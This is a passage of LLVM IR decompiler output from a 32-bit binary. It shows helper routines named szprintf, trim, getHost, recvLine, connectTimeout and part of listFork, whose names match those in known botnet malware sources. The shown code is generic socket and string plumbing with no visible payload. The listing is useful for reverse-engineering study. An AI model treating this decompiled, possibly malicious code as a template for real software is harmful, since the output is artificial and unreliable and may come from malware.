  %v2_80488a5 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_80488a8 = icmp eq i8 %v2_80488a5, 99
  %v1_80488aa = icmp eq i1 %v10_80488a8, false
  br i1 %v1_80488aa, label %dec_label_pc_8048900, label %dec_label_pc_80488ac

dec_label_pc_80488ac:                             ; preds = %dec_label_pc_80488a2
  %v1_80488af = add i32 %stack_var_12.156, 4
  %v1_80488b7 = inttoptr i32 %stack_var_12.156 to i32*
  %v2_80488b7 = load i32, i32* %v1_80488b7, align 4
  store i32 %v2_80488b7, i32* %stack_var_-6, align 4
  %v6_80488db = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa)
  %v5_80488e0 = add i32 %v6_80488db, %stack_var_-28.157
  br label %dec_label_pc_8048900

dec_label_pc_80488e5:                             ; preds = %dec_label_pc_8048690, %dec_label_pc_8048664
  %stack_var_8.2 = phi i8* [ %stack_var_8.458, %dec_label_pc_8048664 ], [ %v22_8048672, %dec_label_pc_8048690 ]
  %v2_80488e8 = load i8, i8* %stack_var_8.2, align 1
  %v3_80488e8 = zext i8 %v2_80488e8 to i32
  %v4_80488f8 = call i32 @printchar(i32* %arg1, i32 %v3_80488e8)
  %v4_80488fd = add i32 %stack_var_-28.157, 1
  br label %dec_label_pc_8048900

dec_label_pc_8048900:                             ; preds = %dec_label_pc_80488a2, %dec_label_pc_80488ac, %dec_label_pc_804885b, %dec_label_pc_8048807, %dec_label_pc_80487b3, %dec_label_pc_804875f, %dec_label_pc_804872d, %dec_label_pc_80488e5
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_80488e5 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80488a2 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80488ac ], [ %stack_var_8.1.lcssa, %dec_label_pc_804885b ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048807 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487b3 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804875f ], [ %stack_var_8.1.lcssa, %dec_label_pc_804872d ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.156, %dec_label_pc_80488e5 ], [ %stack_var_12.156, %dec_label_pc_80488a2 ], [ %v1_80488af, %dec_label_pc_80488ac ], [ %v1_804885e, %dec_label_pc_804885b ], [ %v1_804880a, %dec_label_pc_8048807 ], [ %v1_80487b6, %dec_label_pc_80487b3 ], [ %v1_8048762, %dec_label_pc_804875f ], [ %v1_804870b, %dec_label_pc_804872d ]
  %stack_var_-28.0 = phi i32 [ %v4_80488fd, %dec_label_pc_80488e5 ], [ %stack_var_-28.157, %dec_label_pc_80488a2 ], [ %v5_80488e0, %dec_label_pc_80488ac ], [ %v5_804889d, %dec_label_pc_804885b ], [ %v5_8048849, %dec_label_pc_8048807 ], [ %v5_80487f5, %dec_label_pc_80487b3 ], [ %v5_80487a1, %dec_label_pc_804875f ], [ %v5_804874d, %dec_label_pc_804872d ]
  %v4_8048900 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_8048900 = add i32 %v4_8048900, 1
  %stack_var_8.4 = inttoptr i32 %v5_8048900 to i8*
  %v2_8048906 = load i8, i8* %stack_var_8.4, align 1
  %v4_8048909 = icmp eq i8 %v2_8048906, 0
  %v1_804890b = icmp eq i1 %v4_8048909, false
  br i1 %v1_804890b, label %dec_label_pc_8048664, label %dec_label_pc_8048911

dec_label_pc_8048911:                             ; preds = %dec_label_pc_8048900, %dec_label_pc_8048672, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.157, %dec_label_pc_8048672 ], [ %stack_var_-28.0, %dec_label_pc_8048900 ]
  %v4_8048911 = icmp eq i32* %arg1, null
  br i1 %v4_8048911, label %dec_label_pc_804891f, label %dec_label_pc_8048917

dec_label_pc_8048917:                             ; preds = %dec_label_pc_8048911
  %v2_804891a = load i32, i32* %arg1, align 4
  %v1_804891c = inttoptr i32 %v2_804891a to i8*
  store i8 0, i8* %v1_804891c, align 1
  br label %dec_label_pc_804891f

dec_label_pc_804891f:                             ; preds = %dec_label_pc_8048911, %dec_label_pc_8048917
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_8048900, { 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_80486b4, { 1, 0 }
  uselistorder i8* %v22_8048672, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in55, { 1, 0 }
  uselistorder i32 %stack_var_12.156, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.157, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 1, 3 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804891f, { 1, 0 }
  uselistorder label %dec_label_pc_8048900, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804872d, { 1, 0 }
  uselistorder label %dec_label_pc_80486fe, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80486f4, { 1, 0 }
  uselistorder label %dec_label_pc_80486b4, { 1, 0 }
  uselistorder label %dec_label_pc_8048664, { 1, 0 }
}

define i32 @szprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048924 = load i32, i32* @ebp, align 4
  store i32 %v0_8048924, i32* %stack_var_-4, align 4
  %v4_8048924 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048924, i32* @ebp, align 4
  %v4_804892d = ptrtoint i32* %stack_var_12 to i32
  %v4_8048944 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_804892d)
  ret i32 %v4_8048944

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804894e = load i32, i32* @edi, align 4
  store i32 %v0_804894e, i32* %stack_var_-8, align 4
  %v4_8048959 = ptrtoint i8* %arg1 to i32
  %v3_804896a = call i32 @_strlen(i8* %arg1)
  %v1_8048971 = add i32 %v3_804896a, -1
  br label %dec_label_pc_804897a

dec_label_pc_8048977:                             ; preds = %dec_label_pc_804897a
  %v4_8048977 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804897a

dec_label_pc_804897a:                             ; preds = %entry, %dec_label_pc_8048977
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_8048977, %dec_label_pc_8048977 ]
  %v6_804897d = add i32 %stack_var_-16.0, %v4_8048959
  %v1_8048980 = inttoptr i32 %v6_804897d to i8*
  %v2_8048980 = load i8, i8* %v1_8048980, align 1
  %v2_8048983 = sext i8 %v2_8048980 to i32
  %v2_8048986 = mul nsw i32 %v2_8048983, 2
  %v0_804898a = load i32, i32* inttoptr (i32 134553656 to i32*), align 8
  %v2_804898f = add i32 %v0_804898a, %v2_8048986
  %v1_8048992 = inttoptr i32 %v2_804898f to i16*
  %v2_8048992 = load i16, i16* %v1_8048992, align 2
  %v1_8048995 = and i16 %v2_8048992, 32
  %v2_8048995 = icmp eq i16 %v1_8048995, 0
  %v1_804899a = icmp eq i1 %v2_8048995, false
  br i1 %v1_804899a, label %dec_label_pc_8048977, label %dec_label_pc_80489a1.preheader

dec_label_pc_80489a1.preheader:                   ; preds = %dec_label_pc_804897a
  %v5_80489a717 = icmp slt i32 %v1_8048971, %stack_var_-16.0
  br i1 %v5_80489a717, label %dec_label_pc_80489cb, label %dec_label_pc_80489a9.lr.ph

dec_label_pc_80489a9.lr.ph:                       ; preds = %dec_label_pc_80489a1.preheader
  %v0_80489b9.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_80489a9

dec_label_pc_804899e:                             ; preds = %dec_label_pc_80489a9
  %v4_804899e = add i32 %stack_var_-12.018, -1
  %v5_80489a7 = icmp slt i32 %v4_804899e, %stack_var_-16.0
  br i1 %v5_80489a7, label %dec_label_pc_80489cb, label %dec_label_pc_80489a9

dec_label_pc_80489a9:                             ; preds = %dec_label_pc_80489a9.lr.ph, %dec_label_pc_804899e
  %stack_var_-12.018 = phi i32 [ %v1_8048971, %dec_label_pc_80489a9.lr.ph ], [ %v4_804899e, %dec_label_pc_804899e ]
  %v6_80489ac = add i32 %stack_var_-12.018, %v4_8048959
  %v1_80489af = inttoptr i32 %v6_80489ac to i8*
  %v2_80489af = load i8, i8* %v1_80489af, align 1
  %v2_80489b2 = sext i8 %v2_80489af to i32
  %v2_80489b5 = mul nsw i32 %v2_80489b2, 2
  %v2_80489be = add i32 %v0_80489b9.pre, %v2_80489b5
  %v1_80489c1 = inttoptr i32 %v2_80489be to i16*
  %v2_80489c1 = load i16, i16* %v1_80489c1, align 2
  %v1_80489c4 = and i16 %v2_80489c1, 32
  %v2_80489c4 = icmp eq i16 %v1_80489c4, 0
  %v1_80489c9 = icmp eq i1 %v2_80489c4, false
  br i1 %v1_80489c9, label %dec_label_pc_804899e, label %dec_label_pc_80489cb

dec_label_pc_80489cb:                             ; preds = %dec_label_pc_804899e, %dec_label_pc_80489a9, %dec_label_pc_80489a1.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_8048971, %dec_label_pc_80489a1.preheader ], [ %stack_var_-12.018, %dec_label_pc_80489a9 ], [ %v4_804899e, %dec_label_pc_804899e ]
  %v7_80489f410 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.lcssa
  store i32 %stack_var_-16.0, i32* @edx, align 4
  br i1 %v7_80489f410, label %dec_label_pc_80489f6, label %dec_label_pc_80489d3

dec_label_pc_80489d3:                             ; preds = %dec_label_pc_80489cb, %dec_label_pc_80489d3
  %v6_80489fe12 = phi i32 [ %v6_80489fe, %dec_label_pc_80489d3 ], [ %v4_8048959, %dec_label_pc_80489cb ]
  %storemerge11 = phi i32 [ %v4_80489eb, %dec_label_pc_80489d3 ], [ %stack_var_-16.0, %dec_label_pc_80489cb ]
  %v6_80489e3 = add i32 %storemerge11, %v4_8048959
  %v1_80489e6 = inttoptr i32 %v6_80489e3 to i8*
  %v2_80489e6 = load i8, i8* %v1_80489e6, align 1
  %v3_80489e9 = inttoptr i32 %v6_80489fe12 to i8*
  store i8 %v2_80489e6, i8* %v3_80489e9, align 1
  %v4_80489eb = add i32 %storemerge11, 1
  %v7_80489f4 = icmp sgt i32 %v4_80489eb, %stack_var_-12.0.lcssa
  store i32 %stack_var_-16.0, i32* @edx, align 4
  %v2_80489fc = sub i32 %v4_80489eb, %stack_var_-16.0
  %v6_80489fe = add i32 %v2_80489fc, %v4_8048959
  br i1 %v7_80489f4, label %dec_label_pc_80489f6, label %dec_label_pc_80489d3

dec_label_pc_80489f6:                             ; preds = %dec_label_pc_80489d3, %dec_label_pc_80489cb
  %v6_80489fe.lcssa = phi i32 [ %v4_8048959, %dec_label_pc_80489cb ], [ %v6_80489fe, %dec_label_pc_80489d3 ]
  %v22_80489fe = inttoptr i32 %v6_80489fe.lcssa to i8*
  store i8 0, i8* %v22_80489fe, align 1
  %v2_8048a07 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048a07, i32* @edi, align 4
  ret i32 %v6_80489fe.lcssa

; uselistorder directives
  uselistorder i32 %v6_80489fe.lcssa, { 1, 0 }
  uselistorder i32 %v4_80489eb, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.018, { 0, 2, 1 }
  uselistorder i32 %v4_804899e, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 2, 1, 0, 5, 4, 3, 6, 7, 8 }
  uselistorder i32 %v1_8048971, { 2, 1, 0 }
  uselistorder i32 %v4_8048959, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80489d3, { 1, 0 }
  uselistorder label %dec_label_pc_80489cb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80489a9, { 1, 0 }
  uselistorder label %dec_label_pc_804897a, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_8048a0a = load i32, i32* @ebp, align 4
  %v1_8048a16 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048a16, i32* %arg2, align 4
  %v10_8048a27 = icmp eq i32 %v1_8048a16, -1
  %. = zext i1 %v10_8048a27 to i32
  store i32 %v0_8048a0a, i32* @ebp, align 4
  ret i32 %.
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048a44 = load i32, i32* @edi, align 4
  store i32 %v0_8048a44, i32* %stack_var_-8, align 4
  %v4_8048a4e = ptrtoint i8* %arg2 to i32
  %v1_8048a56 = and i32 %v4_8048a4e, -256
  %v5_8048a58 = call i8* @_memset(i8* %arg2, i32 %v1_8048a56, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_8048a78 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i1 false, i1* @df, align 1
  %v5_8048a7f = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_8048a8c = udiv i32 %arg1, 32
  %v1_8048a92 = urem i32 %arg1, 32
  %v0_8048a95 = load i32, i32* @ebp, align 4
  %v2_8048a95 = mul nuw nsw i32 %v2_8048a8c, 4
  %v3_8048a95 = add nsw i32 %v2_8048a95, -164
  %v4_8048a95 = add i32 %v3_8048a95, %v0_8048a95
  %v5_8048a95 = inttoptr i32 %v4_8048a95 to i32*
  %v6_8048a95 = load i32, i32* %v5_8048a95, align 4
  %v9_8048a95 = shl i32 1, %v1_8048a92
  %v12_8048a95 = or i32 %v6_8048a95, %v9_8048a95
  store i32 %v12_8048a95, i32* %v5_8048a95, align 4
  %v1_8048aa0 = add i32 %arg1, 1
  %v2_8048aa1 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8048aca = call i32 @__libc_select(i32 %v1_8048aa0, i32 %v2_8048a78, i32 0, i32 %v2_8048a78, i32 %v2_8048aa1)
  %tmp33 = icmp slt i32 %v5_8048aca, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_8048b6c, label %dec_label_pc_8048b62.preheader

dec_label_pc_8048b62.preheader:                   ; preds = %entry
  %v7_8048b6643 = icmp sgt i32 %tmp11, 9
  br i1 %v7_8048b6643, label %dec_label_pc_8048b6c, label %dec_label_pc_8048ae1

dec_label_pc_8048ae1:                             ; preds = %dec_label_pc_8048b62.preheader, %dec_label_pc_8048b5f
  %stack_var_-36.044 = phi i32 [ %v4_8048b5f, %dec_label_pc_8048b5f ], [ %tmp11, %dec_label_pc_8048b62.preheader ]
  store i32 30, i32* %stack_var_-176, align 4
  store i1 false, i1* @df, align 1
  %v5_8048b06 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v0_8048b1c = load i32, i32* @ebp, align 4
  %v4_8048b1c = add i32 %v3_8048a95, %v0_8048b1c
  %v5_8048b1c = inttoptr i32 %v4_8048b1c to i32*
  %v6_8048b1c = load i32, i32* %v5_8048b1c, align 4
  %v12_8048b1c = or i32 %v6_8048b1c, %v9_8048a95
  store i32 %v12_8048b1c, i32* %v5_8048b1c, align 4
  %v5_8048b51 = call i32 @__libc_select(i32 %v1_8048aa0, i32 %v2_8048a78, i32 0, i32 %v2_8048a78, i32 %v2_8048aa1)
  %tmp35 = icmp slt i32 %v5_8048b51, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_8048b6c, label %dec_label_pc_8048b5f

dec_label_pc_8048b5f:                             ; preds = %dec_label_pc_8048ae1
  %v4_8048b5f = add nsw i32 %stack_var_-36.044, 1
  %v7_8048b66 = icmp sgt i32 %stack_var_-36.044, 8
  br i1 %v7_8048b66, label %dec_label_pc_8048b6c, label %dec_label_pc_8048ae1

dec_label_pc_8048b6c:                             ; preds = %dec_label_pc_8048b62.preheader, %dec_label_pc_8048ae1, %dec_label_pc_8048b5f, %entry
  %v2_8048b90 = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8048bd6

dec_label_pc_8048b7b:                             ; preds = %dec_label_pc_8048bd6
  %v0_8048b7b = load i32, i32* @global_var_8052308.15, align 8
  %v4_8048b9d = call i32 @__libc_recv(i32 %v0_8048b7b, i32 %v2_8048b90, i32 1, i32 0)
  %v9_8048ba2 = icmp eq i32 %v4_8048b9d, 1
  br i1 %v9_8048ba2, label %dec_label_pc_8048bb9, label %dec_label_pc_8048ba7

dec_label_pc_8048ba7:                             ; preds = %dec_label_pc_8048b7b
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_8048bf3

dec_label_pc_8048bb9:                             ; preds = %dec_label_pc_8048b7b
  %v3_8048bb9 = load i8, i8* %stack_var_-177, align 1
  %v4_8048bc0 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8048bb9, i8* %stack_var_-32.0, align 1
  %v5_8048bc5 = add i32 %v4_8048bc0, 1
  %v22_8048bc5 = inttoptr i32 %v5_8048bc5 to i8*
  %v3_8048bc8 = load i8, i8* %stack_var_-177, align 1
  %v10_8048bcf = icmp eq i8 %v3_8048bc8, 10
  br i1 %v10_8048bcf, label %dec_label_pc_8048be4, label %dec_label_pc_8048bd3

dec_label_pc_8048bd3:                             ; preds = %dec_label_pc_8048bb9
  %v4_8048bd3 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8048bd6

dec_label_pc_8048bd6:                             ; preds = %dec_label_pc_8048b6c, %dec_label_pc_8048bd3
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_8048b6c ], [ %v22_8048bc5, %dec_label_pc_8048bd3 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048b6c ], [ %v4_8048bd3, %dec_label_pc_8048bd3 ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_8048b6c ], [ %v4_8048bd6, %dec_label_pc_8048bd3 ]
  %v4_8048bd6 = add i32 %stack_var_12.0, -1
  %v9_8048bd6 = sub i32 0, %stack_var_12.0
  %v10_8048bd6 = and i32 %stack_var_12.0, %v9_8048bd6
  %v11_8048bd6 = icmp slt i32 %v10_8048bd6, 0
  %v12_8048bd6 = icmp eq i32 %v4_8048bd6, 0
  %v13_8048bd6 = icmp slt i32 %v4_8048bd6, 0
  %v3_8048bda = icmp eq i1 %v13_8048bd6, %v11_8048bd6
  %v4_8048bda = icmp eq i1 %v12_8048bd6, false
  %v5_8048bda = and i1 %v4_8048bda, %v3_8048bda
  %v4_8048be0 = icmp eq i1 %v5_8048bda, false
  %v1_8048be2 = icmp eq i1 %v4_8048be0, false
  br i1 %v1_8048be2, label %dec_label_pc_8048b7b, label %dec_label_pc_8048be4

dec_label_pc_8048be4:                             ; preds = %dec_label_pc_8048bb9, %dec_label_pc_8048bd6
  %stack_var_-32.1 = phi i8* [ %v22_8048bc5, %dec_label_pc_8048bb9 ], [ %stack_var_-32.0, %dec_label_pc_8048bd6 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_8048bf3

dec_label_pc_8048bf3:                             ; preds = %dec_label_pc_8048ba7, %dec_label_pc_8048be4
  %storemerge = phi i32 [ -1, %dec_label_pc_8048ba7 ], [ %stack_var_-28.0, %dec_label_pc_8048be4 ]
  %v2_8048bff = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048bff, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048bd6, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_8048bc5, { 1, 0 }
  uselistorder i32 %v2_8048a78, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048bf3, { 1, 0 }
  uselistorder label %dec_label_pc_8048be4, { 1, 0 }
  uselistorder label %dec_label_pc_8048bd6, { 1, 0 }
  uselistorder label %dec_label_pc_8048b6c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8048ae1, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048c05 = load i32, i32* @edi, align 4
  store i32 %v0_8048c05, i32* %stack_var_-8, align 4
  %v3_8048c22 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8048c2a = or i32 %v3_8048c22, 2048
  %v3_8048c46 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8048c2a)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_8048c5a = trunc i32 %arg3 to i16
  %v2_8048c5a = call i32 @htons(i16 %v1_8048c5a)
  store i32 %arg2, i32* @edx, align 4
  %v3_8048c76 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8048c7b = icmp eq i32 %v3_8048c76, 0
  br i1 %v1_8048c7b, label %dec_label_pc_8048c8e, label %dec_label_pc_8048dfe

dec_label_pc_8048c8e:                             ; preds = %entry
  %v2_8048c69 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8048cb6 = call i32 @__libc_connect(i32 %arg1, i32 %v2_8048c69, i32 16)
  %v5_8048cbe = icmp slt i32 %v3_8048cb6, 0
  %v1_8048cc2 = icmp eq i1 %v5_8048cbe, false
  br i1 %v1_8048cc2, label %dec_label_pc_8048db5, label %dec_label_pc_8048cc8

dec_label_pc_8048cc8:                             ; preds = %dec_label_pc_8048c8e
  %v1_8048cc8 = call i32 @__errno_location(i32 %v3_8048cb6)
  %v1_8048ccd = inttoptr i32 %v1_8048cc8 to i32*
  %v2_8048ccd = load i32, i32* %v1_8048ccd, align 4
  %v9_8048ccf = icmp eq i32 %v2_8048ccd, 115
  %v1_8048cd2 = icmp eq i1 %v9_8048ccf, false
  br i1 %v1_8048cd2, label %dec_label_pc_8048dfe, label %dec_label_pc_8048cd8

dec_label_pc_8048cd8:                             ; preds = %dec_label_pc_8048cc8
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8048cf5 = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8048cf5, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048cfc = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_8048d09 = udiv i32 %arg1, 32
  %v1_8048d0f = urem i32 %arg1, 32
  %v0_8048d12 = load i32, i32* @ebp, align 4
  %v2_8048d12 = mul nuw nsw i32 %v2_8048d09, 4
  %v3_8048d12 = add nsw i32 %v2_8048d12, -164
  %v4_8048d12 = add i32 %v3_8048d12, %v0_8048d12
  %v5_8048d12 = inttoptr i32 %v4_8048d12 to i32*
  %v6_8048d12 = load i32, i32* %v5_8048d12, align 4
  %v9_8048d12 = shl i32 1, %v1_8048d0f
  %v12_8048d12 = or i32 %v6_8048d12, %v9_8048d12
  store i32 %v12_8048d12, i32* %v5_8048d12, align 4
  %v1_8048d1d = add i32 %arg1, 1
  %v2_8048d1e = ptrtoint i32* %stack_var_-176 to i32
  %v5_8048d45 = call i32 @__libc_select(i32 %v1_8048d1d, i32 0, i32 %v2_8048cf5, i32 0, i32 %v2_8048d1e)
  %tmp28 = icmp slt i32 %v5_8048d45, 1
  br i1 %tmp28, label %dec_label_pc_8048dfe, label %dec_label_pc_8048d4e

dec_label_pc_8048d4e:                             ; preds = %dec_label_pc_8048cd8
  store i32 4, i32* %stack_var_-180, align 4
  %v2_8048d58 = ptrtoint i32* %stack_var_-180 to i32
  %v2_8048d62 = ptrtoint i32* %stack_var_-184 to i32
  %v5_8048d82 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_8048d62, i32 %v2_8048d58)
  %v3_8048d87 = load i32, i32* %stack_var_-184, align 4
  %v1_8048d8d = icmp eq i32 %v3_8048d87, 0
  br i1 %v1_8048d8d, label %dec_label_pc_8048db5, label %dec_label_pc_8048dfe

dec_label_pc_8048db5:                             ; preds = %dec_label_pc_8048d4e, %dec_label_pc_8048c8e
  %v3_8048dcb = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8048dd3 = and i32 %v3_8048dcb, -2049
  %v3_8048def = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8048dd3)
  br label %dec_label_pc_8048dfe

dec_label_pc_8048dfe:                             ; preds = %dec_label_pc_8048cc8, %dec_label_pc_8048cd8, %dec_label_pc_8048d4e, %entry, %dec_label_pc_8048db5
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_8048db5 ], [ 0, %entry ], [ 0, %dec_label_pc_8048d4e ], [ 0, %dec_label_pc_8048cd8 ], [ 0, %dec_label_pc_8048cc8 ]
  %v2_8048e0a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048e0a, i32* @edi, align 4
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8048dfe, { 4, 2, 1, 0, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8048e10 = load i32, i32* @ebx, align 4
  store i32 %v0_8048e10, i32* %stack_var_-8, align 4
  %v1_8048e14 = call i32 @__libc_fork(i32 %v0_8048e10)
  %v4_8048e1c = icmp eq i32 %v1_8048e14, 0
  %v1_8048e20 = icmp eq i1 %v4_8048e1c, false
  br i1 %v1_8048e20, label %dec_label_pc_8048e2d, label %dec_label_pc_8048e22

dec_label_pc_8048e22:                             ; preds = %entry
  br label %dec_label_pc_8048f09

dec_label_pc_8048e2d:                             ; preds = %entry
  %v0_8048e2d = load i32, i32* @global_var_8052300.16, align 256
  %v0_8048e32 = load i32, i32* @global_var_8052304.17, align 4
  %v1_8048e38 = add i32 %v0_8048e2d, 1
  %v5_8048e38 = icmp eq i32 %v0_8048e2d, -1
  %v2_8048e3b = zext i1 %v5_8048e38 to i32
  %v3_8048e3b = add i32 %v2_8048e3b, %v0_8048e32
  store i32 %v1_8048e38, i32* @global_var_8052300.16, align 256
  store i32 %v3_8048e3b, i32* @global_var_8052304.17, align 4
  %v2_8048e58 = mul i32 %v1_8048e38, 4
  %v1_8048e5b = add i32 %v2_8048e58, 4
  %v1_8048e61 = call i32 @malloc(i32 %v1_8048e5b)
  br label %dec_label_pc_8048e94

dec_label_pc_8048e72:                             ; preds = %dec_label_pc_8048e94, %dec_label_pc_8048ec5
  %v2_8048e75 = mul i32 %storemerge1, 4
  %v5_8048e7a = add i32 %v2_8048e75, %v1_8048e61
  %v0_8048e85 = load i32, i32* @global_var_8054564.18, align 4
  %v2_8048e8a = add i32 %v0_8048e85, %v2_8048e75
  %v1_8048e8d = inttoptr i32 %v2_8048e8a to i32*
  %v2_8048e8d = load i32, i32* %v1_8048e8d, align 4
  %v2_8048e8f = inttoptr i32 %v5_8048e7a to i32*
  store i32 %v2_8048e8d, i32* %v2_8048e8f, align 4
  %v4_8048e91 = add i32 %storemerge1, 1
  br label %dec_label_pc_8048e94

dec_label_pc_8048e94:                             ; preds = %dec_label_pc_8048e2d, %dec_label_pc_8048e72
  %storemerge1 = phi i32 [ %v4_8048e91, %dec_label_pc_8048e72 ], [ 0, %dec_label_pc_8048e2d ]
  %v0_8048ea2 = load i32, i32* @global_var_8052300.16, align 256
  %v0_8048ea7 = load i32, i32* @global_var_8052304.17, align 4
  %v4_8048eb1 = icmp ne i32 %v0_8048ea2, 0
  %v2_8048eb4 = zext i1 %v4_8048eb1 to i32
  %v3_8048eb4 = add i32 %v0_8048ea7, -1
  %v4_8048eb4 = add i32 %v3_8048eb4, %v2_8048eb4
  store i32 %v4_8048eb4, i32* @ebx, align 4
  %v10_8048ec0 = icmp eq i32 %v4_8048eb4, 0
  br i1 %v10_8048ec0, label %dec_label_pc_8048ec5, label %dec_label_pc_8048e72

dec_label_pc_8048ec5:                             ; preds = %dec_label_pc_8048e94
  %v1_8048eb1 = add i32 %v0_8048ea2, -1
  %v10_8048ed0 = icmp ult i32 %storemerge1, %v1_8048eb1
